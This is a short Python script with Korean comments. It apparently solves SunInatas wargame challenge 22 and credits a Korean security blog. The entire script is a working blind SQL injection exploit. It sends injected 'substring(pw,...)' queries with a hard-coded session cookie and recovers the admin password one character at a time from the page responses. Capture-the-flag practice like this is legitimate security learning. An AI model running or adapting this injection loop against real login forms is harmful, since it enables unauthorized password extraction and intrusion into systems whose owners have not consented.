# -*- coding: utf-8 -*- 
#>>파이썬 한글 에러 처리 주석
import requests 
# url
url = "http://suninatas.com/challenge/web22/web22.asp"
 
cookie = {"ASPSESSIONIDCSSCCCBB" : "KPFDBEICFONODJOEKNGCGIDL"}
wordlist = "abcdefghijklmnop1234567890ABCDEFGHIJKLMNOP<>?!@#$%^&*()_+"
result  = ""
 
 
print("써니스타스 22번")
print("블라인드 인젝션을 시작합니다.")
 
for i in range(0, 10):
    for k in range(0, len(wordlist)):
        query = "admin'and(substring(pw," + str(i+1) + ",1)='" + wordlist[k] + "')--"
        r = requests.get(url, params={'id': query, 'pw': 'penekGOD'}, cookies=cookie)
    
        if "OK" in r.text:
            print("[+]" + str(i+1) + "번째 비밀번호는 " + wordlist[k] + "입니다.")
            result += wordlist[k]
            break
 
print("[!]" + " 최종 비밀번호는 " + result + "입니다.")


##출처: https://penek.tistory.com/58 [꿈꾸는자칭 짱짱햌커.]